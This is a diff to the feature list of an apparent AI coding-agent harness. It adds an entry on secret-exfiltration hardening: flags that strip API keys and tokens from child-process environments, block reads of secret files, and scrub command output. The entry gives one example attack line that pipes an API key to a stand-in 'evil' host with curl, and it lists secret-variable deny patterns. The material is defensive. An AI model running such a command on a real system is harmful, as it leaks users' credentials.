@@ -15,8 +15,15 @@ below was a `.env` change, never a code change:
 - **thinkingmachines/Inkling on Together** — `https://api.together.xyz/v1`, OpenAI-compatible.
 - **gpt-oss-120b on AWS Bedrock / self-hosted vLLM (RunPod)** — the original baseline; last measured eval 13/13.
 
-## Features (specs/0022–0077)
+## Features (specs/0022–0078)
 
+- `0078` **secret-exfil hardening** — Phase 1 of adopting Codex's security posture (a Codex-vs-OAC review found
+  secrets were freely exfiltrable). Three default-off flags: `CODE_ENV_SCRUB` spawns `run_command` children with
+  an allowlisted env (drops `CODE_*` + `*api_key*`/`*secret*`/`*token*` vars) so a child can't
+  `echo $env:CODE_API_KEY | curl evil`; `CODE_SECRET_DENY_READ` denies `read_file` of a designated secret file
+  (`.env`/keys) and skips them in grep/glob/tree; `CODE_SCRUB_OUTPUT` runs the scrubber over live `run_command`
+  output before the model sees it. Removes the exfil path itself — the tool/env layer; an OS sandbox
+  (`CODE_WIN_SANDBOX`) + net-fence are the later phases. No OS primitive required.
 - `0077` **train / harness-audit** — the final bug-hunt batch: `train/curate.py` `_seen_blob` normalizes
   backslashes so a Windows-discovered file (`src\main.py`) grounds its `/`-normalized citation instead of being
   dropped as a phantom; and three harness weaknesses are fixed — `check_scrub`'s opt-in check was a tautology
